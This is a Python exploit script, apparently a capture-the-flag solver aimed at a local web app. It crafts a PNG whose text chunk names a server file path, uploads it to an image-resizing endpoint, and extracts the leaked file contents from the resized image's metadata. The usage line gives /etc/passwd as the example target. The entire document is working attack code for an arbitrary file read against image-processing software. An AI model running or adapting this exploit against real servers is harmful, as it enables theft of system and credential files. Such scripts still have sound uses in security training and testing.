#!/usr/bin/env python3
import requests
import struct
import binascii
import zlib
import os
import sys

BASE_URL = "http://localhost:1337"

def create_payload(filepath, output="payload.png"):
    png_sig = b"\x89PNG\r\n\x1a\n"
    ihdr_data = struct.pack(">II", 1, 1) + b"\x08\x06\x00\x00\x00"
    ihdr = struct.pack(">I", len(ihdr_data)) + b"IHDR" + ihdr_data
    ihdr += struct.pack(">I", binascii.crc32(ihdr[4:]) & 0xFFFFFFFF)

    text_data = b"profile\x00" + filepath.encode()
    text_chunk = struct.pack(">I", len(text_data)) + b"tEXt" + text_data
    text_chunk += struct.pack(">I", binascii.crc32(text_chunk[4:]) & 0xFFFFFFFF)

    idat_data = b"\x08\x1d\x01\x05\x00\xfa\xff\x00\x00\x00\x00\x00\x00\x05\x00\x01"
    idat = struct.pack(">I", len(idat_data)) + b"IDAT" + idat_data
    idat += struct.pack(">I", binascii.crc32(idat[4:]) & 0xFFFFFFFF)

    iend = struct.pack(">I", 0) + b"IEND"
    iend += struct.pack(">I", binascii.crc32(iend[4:]) & 0xFFFFFFFF)

    with open(output, "wb") as f:
        f.write(png_sig + ihdr + text_chunk + idat + iend)
    return output

def debug_extract_all_metadata(image_content):
    idx = 8
    found_any = False
    print("\n--- DEBUG: ALL TEXT METADATA FOUND ---")
    
    while idx < len(image_content):
        if idx + 8 > len(image_content):
            break
            
        length = struct.unpack(">I", image_content[idx:idx+4])[0]
        chunk_type = image_content[idx+4:idx+8]
        
        if idx + 8 + length + 4 > len(image_content):
             print(f"[!] Warning: Chunk {chunk_type.decode(errors='ignore')} appears truncated.")
             break
             
        chunk_data = image_content[idx+8:idx+8+length]
        idx += 12 + length

        text_content = None
        
        if chunk_type == b"zTXt":
            null_idx = chunk_data.find(b"\x00")
            if null_idx != -1:
                key = chunk_data[:null_idx].decode('utf-8', errors='ignore')
                compressed = chunk_data[null_idx+2:]
                try:
                    text_content = zlib.decompress(compressed).decode('utf-8', errors='ignore')
                    print(f"\n[zTXt Chunk] Key: '{key}'\nDecompressed Content:\n{text_content}\n{'-'*20}")
                    found_any = True
                except Exception as e:
                    print(f"\n[zTXt Chunk] Key: '{key}' (Failed to decompress: {e})")
                    
        elif chunk_type == b"tEXt":
            null_idx = chunk_data.find(b"\x00")
            if null_idx != -1:
                key = chunk_data[:null_idx].decode('utf-8', errors='ignore')
                text_content = chunk_data[null_idx+1:].decode('utf-8', errors='ignore')
                print(f"\n[tEXt Chunk] Key: '{key}'\nContent:\n{text_content}\n{'-'*20}")
                found_any = True

    if not found_any:
        print("\n[-] No text metadata chunks (tEXt/zTXt) found in the image.")
    print("---------------------------------------")

def exploit(target_file):
    print(f"[*] Generating malicious PNG to read: {target_file}")
    payload_file = create_payload(target_file)
    
    print(f"[*] Uploading payload to {BASE_URL}/upload...")
    try:
        with open(payload_file, "rb") as f:
            files = {'image': ('payload.png', f, 'image/png')}
            res = requests.post(f"{BASE_URL}/upload", files=files, timeout=30)
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return
        
    if res.status_code != 200:
        print(f"[-] Upload failed (Status {res.status_code}): {res.text}")
        return
        
    try:
        out_filename = res.json().get('filename')
    except Exception as e:
        print(f"[-] Failed to parse JSON response: {e}\nResponse text: {res.text}")
        return
        
    print(f"[+] Upload success. Resized image: {out_filename}")
    
    print(f"[*] Downloading resized image...")
    res_img = requests.get(f"{BASE_URL}/uploads/{out_filename}", timeout=30)
    if res_img.status_code != 200:
        print(f"[-] Failed to download resized image (Status {res_img.status_code}).")
        return
        
    # Call the new debug function to print ALL text metadata
    debug_extract_all_metadata(res_img.content)

    os.remove(payload_file)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 solver_debug.py <file_to_read>")
        print("Example: python3 solver_debug.py /etc/passwd")
        sys.exit(1)
    exploit(sys.argv[1])
